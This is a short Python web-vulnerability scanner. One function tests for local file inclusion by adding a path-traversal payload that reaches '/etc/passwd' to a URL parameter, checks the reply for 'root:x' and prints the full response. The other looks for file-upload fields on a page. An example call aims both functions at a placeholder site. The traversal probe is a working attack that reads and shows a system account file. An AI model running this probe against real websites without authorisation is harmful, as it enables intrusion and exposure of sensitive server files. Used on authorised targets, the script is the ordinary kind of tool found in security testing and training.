from bs4 import BeautifulSoup
import requests
import re

def file_include_vulnerability(url):
    try:
        index = url.find("=")
        if index == -1:
            print("[-] No parameter found in URL to test for file inclusion vulnerability.")
            return
        
        payload_url = url[:index + 1] + "../../../../../../etc/passwd"
        response = requests.get(payload_url)
        
        if "root:x" in response.content.decode('utf-8', errors='ignore'):
            print("[+] File include possible, payload: ../../../../../../etc/passwd")
            print("Response: ", response.content.decode('utf-8', errors='ignore'))
        else:
            print("[-] File include isn't possible, payload: ../../../../../../etc/passwd")
            print("Response: ", response.content.decode('utf-8', errors='ignore'))
    except requests.RequestException as e:
        print(f"Error accessing {url}: {e}")

def file_upload_vulnerability(url):
    try:
        page = requests.get(url)
        soup = BeautifulSoup(page.content, 'html.parser')
        inputs = soup.find_all('input', {'type': 'file'})
        
        if inputs:
            print("[+] File Upload Function available")
        else:
            print("[-] File Upload Function not found")
    except requests.RequestException as e:
        print(f"Error accessing {url}: {e}")

# Example usage
url = "https://vulnerable-website.com/"
file_include_vulnerability(url)
file_upload_vulnerability(url)
